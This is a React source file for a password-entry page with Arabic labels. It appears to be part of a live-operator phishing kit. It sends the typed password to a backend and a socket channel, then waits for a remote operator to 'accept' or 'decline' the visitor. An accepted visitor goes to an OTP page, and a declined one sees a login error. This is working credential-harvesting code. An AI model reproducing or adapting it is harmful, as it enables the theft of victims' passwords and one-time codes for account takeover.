import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { TbWorld } from "react-icons/tb";
import { id } from "./Home";

const Password = () => {
  const [loading, setLoading] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    try {
      await axios
        .post(api_route + "/password/" + id, { password })
        .then(({ data }) => {
          console.log(data);
          socket.emit("password", data);
        });
    } catch (error) {
      console.log(error);
    }
  };
  socket.on("acceptUser", (data) => {
    if (data === id) {
      window.location.href = " /otp";
    }
  });
  socket.on("declineUser", (id) => {
    setLoading(false);
    setError(true);
  });
  return (
    <div className="w-full flex flex-col items-center justify-center gap-y-4">
      <form
        className="w-11/12 flex items-center justify-center flex-col gap-y-3 py-3  md:w-1/3 min-w-1/3"
        onSubmit={handleSubmit}
      >
        <div className="w-full flex p-2 items-center gap-x-2 text-lg text-gray-400">
          <TbWorld className="text-3xl" />
          English
        </div>
        <div className="w-full flex flex-col gap-y-10 justify-center items-center mt-6">
          <img src="/img1.png" className="w-1/2" />
          <img src="/img3.png" className="w-1/2" />
        </div>

        <div className="w-full flex flex-col my-10">
          <input
            type="password"
            required
            dir="rtl"
            placeholder="كلمة المرور"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="border border-zinc-500 rounded-md text-lg px-3 py-2 w-11/12"
          />
          <div className="w-11/12 flex items-center justify-center gap-x-2 py-5">
            <img src="/img2.jpg" className="w-14" />
            <button
              type="submit"
              className="bg-green-700 rounded-md text-white py-3 px-2 w-2/3"
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <TailSpin
                    height="30"
                    width="30"
                    color="white"
                    ariaLabel="tail-spin-loading"
                    radius="1"
                    wrapperStyle={{}}
                    wrapperClass=""
                    visible={true}
                  />
                </div>
              ) : (
                " متابعة"
              )}
            </button>
          </div>
          {error && (
            <div className="w-full text-red-700 py-2 text-center">
              بيانات الدخول غير صحيحة
            </div>
          )}
        </div>
      </form>
    </div>
  );
};

export default Password;
